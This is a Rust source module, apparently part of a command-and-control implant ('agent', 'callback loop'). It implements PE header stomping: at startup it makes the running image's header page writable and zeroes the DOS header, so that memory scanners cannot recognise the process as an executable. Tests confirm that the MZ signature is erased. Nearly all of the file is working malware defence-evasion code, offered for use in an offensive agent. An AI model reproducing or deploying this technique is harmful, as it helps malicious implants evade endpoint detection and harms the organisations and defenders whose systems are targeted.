//! PE header stomping — erase the MZ/PE signature at agent startup.
//!
//! Zeroes the DOS header (`MZ` magic and the `e_lfanew` field) of the
//! running module image so that memory scanners looking for `MZ`/`PE\0\0`
//! signatures cannot identify the process image as a Portable Executable.
//!
//! # Technique
//!
//! 1. Locate the running module image via `GetModuleHandleW(NULL)`.
//! 2. Validate the DOS signature so we do not corrupt unrelated memory.
//! 3. Change the header page protection to `PAGE_READWRITE` via `VirtualProtect`.
//! 4. Zero the first 64 bytes of the DOS header (includes `e_magic`, the DOS
//!    stub size hint, `e_lfanew`, and the PE signature that `e_lfanew` points to).
//! 5. Restore the original page protection.
//!
//! This stomp is **permanent** for the lifetime of the process.  Unlike the
//! Cronos sleep-obfuscation technique (which backs up and restores headers
//! around the sleep window), startup stomping is a one-shot operation with no
//! restore path.
//!
//! # Non-Windows builds
//!
//! This module compiles as a no-op on non-Windows targets so that Linux CI
//! cross-compilation continues to work.

use thiserror::Error;

/// Errors returned by [`stomp_pe_headers`].
#[derive(Debug, Error)]
pub enum StompError {
    /// `GetModuleHandleW(NULL)` returned a null handle.
    #[error("GetModuleHandleW returned null")]
    GetModuleHandle,

    /// The first two bytes of the image are not the expected MZ signature
    /// (`0x5A4D`).  The stomp is aborted rather than corrupting unknown memory.
    #[error("module does not have a valid MZ signature — stomp aborted")]
    InvalidDosSignature,

    /// `VirtualProtect` failed to make the header page writable.  The
    /// contained value is the Win32 last-error code.
    #[error("VirtualProtect failed (last_error={0})")]
    VirtualProtect(u32),
}

/// Erase the MZ/PE signature from the running module image.
///
/// Call this once at agent startup, before the main callback loop begins.
/// After a successful call the first [`DOS_HEADER_STOMP_LEN`] bytes of the
/// module image are zeroed, removing the `MZ` magic and the offset to the NT
/// headers.
///
/// # Errors
///
/// Returns [`StompError`] if `GetModuleHandleW` fails, if the image does not
/// carry a valid `MZ` signature, or if `VirtualProtect` fails.
///
/// # Safety (Windows)
///
/// Modifies the live memory of the running process image.  The agent must not
/// call any Win32 or CRT functions that read the module's PE headers after
/// this function returns.  In practice the Windows loader has already finished
/// mapping the image before the Rust entry point runs, so this is safe.
pub fn stomp_pe_headers() -> Result<(), StompError> {
    #[cfg(windows)]
    {
        imp::stomp()
    }
    #[cfg(not(windows))]
    {
        Ok(())
    }
}

/// Number of bytes zeroed at the start of the DOS header.
///
/// The DOS header struct (`IMAGE_DOS_HEADER`) is 64 bytes.  Zeroing this
/// region removes the `e_magic` (`MZ`) field as well as `e_lfanew` (the
/// pointer to the NT headers).  The PE signature word at `e_lfanew` is also
/// zeroed independently if it lies within a readable region.
pub const DOS_HEADER_STOMP_LEN: usize = 64;

// ─── Windows implementation ──────────────────────────────────────────────────

#[cfg(windows)]
#[allow(unsafe_code)]
mod imp {
    use windows_sys::Win32::Foundation::{FALSE, GetLastError};
    use windows_sys::Win32::System::LibraryLoader::GetModuleHandleW;
    use windows_sys::Win32::System::Memory::{PAGE_READWRITE, VirtualProtect};
    use windows_sys::Win32::System::SystemServices::IMAGE_DOS_SIGNATURE;

    use super::{DOS_HEADER_STOMP_LEN, StompError};

    /// Windows implementation: locate module base, change protection, zero headers.
    pub(super) fn stomp() -> Result<(), StompError> {
        // SAFETY: All Win32 calls follow their documented API contracts.
        unsafe {
            // ── Locate the module image ───────────────────────────────────
            let hmodule = GetModuleHandleW(std::ptr::null());
            if hmodule.is_null() {
                return Err(StompError::GetModuleHandle);
            }
            let base = hmodule as *mut u8;

            // ── Validate MZ signature ─────────────────────────────────────
            // Read the first two bytes as a little-endian u16 to check for
            // the `MZ` magic before writing anything.
            let magic = base.cast::<u16>().read_unaligned();
            if magic != IMAGE_DOS_SIGNATURE {
                return Err(StompError::InvalidDosSignature);
            }

            // ── Make the header page writable ─────────────────────────────
            let mut old_protect: u32 = 0;
            let ok =
                VirtualProtect(base.cast(), DOS_HEADER_STOMP_LEN, PAGE_READWRITE, &mut old_protect);
            if ok == FALSE {
                return Err(StompError::VirtualProtect(GetLastError()));
            }

            // ── Zero the DOS header region ────────────────────────────────
            std::slice::from_raw_parts_mut(base, DOS_HEADER_STOMP_LEN).fill(0);

            // ── Restore original page protection ─────────────────────────
            let mut dummy: u32 = 0;
            VirtualProtect(base.cast(), DOS_HEADER_STOMP_LEN, old_protect, &mut dummy);

            tracing::debug!(
                base = format_args!("{base:p}"),
                bytes = DOS_HEADER_STOMP_LEN,
                "PE header stomped at startup"
            );

            Ok(())
        }
    }
}

// ─── Non-Windows stub ────────────────────────────────────────────────────────

#[cfg(not(windows))]
mod imp {}

// ─── Tests ───────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    /// On non-Windows builds the call must succeed (no-op).
    #[cfg(not(windows))]
    #[test]
    fn stomp_is_noop_on_non_windows() {
        assert!(stomp_pe_headers().is_ok(), "stomp_pe_headers() should be a no-op on non-Windows");
    }

    /// On non-Windows builds, multiple calls must all succeed.
    #[cfg(not(windows))]
    #[test]
    fn stomp_is_idempotent_on_non_windows() {
        for _ in 0..5 {
            assert!(stomp_pe_headers().is_ok());
        }
    }

    /// DOS_HEADER_STOMP_LEN must cover the full IMAGE_DOS_HEADER (64 bytes).
    #[test]
    fn stomp_len_covers_dos_header() {
        // IMAGE_DOS_HEADER is 64 bytes; our stomp must cover at minimum that.
        assert_eq!(DOS_HEADER_STOMP_LEN, 64);
    }

    /// On Windows, [`stomp_pe_headers`] must successfully erase the MZ magic.
    ///
    /// NOTE: This test modifies the live module image.  It is intentionally
    /// placed last and only runs in `#[cfg(windows)]` test builds.
    #[cfg(windows)]
    #[test]
    fn stomp_erases_mz_magic_on_windows() {
        use windows_sys::Win32::System::LibraryLoader::GetModuleHandleW;

        let result = stomp_pe_headers();
        assert!(result.is_ok(), "stomp_pe_headers() failed: {result:?}");

        // After the stomp, the first two bytes must be zero (no longer MZ).
        let magic_after = unsafe {
            let base = GetModuleHandleW(std::ptr::null()) as *const u16;
            base.read_unaligned()
        };
        assert_eq!(magic_after, 0, "MZ magic was not zeroed by stomp");
    }
}
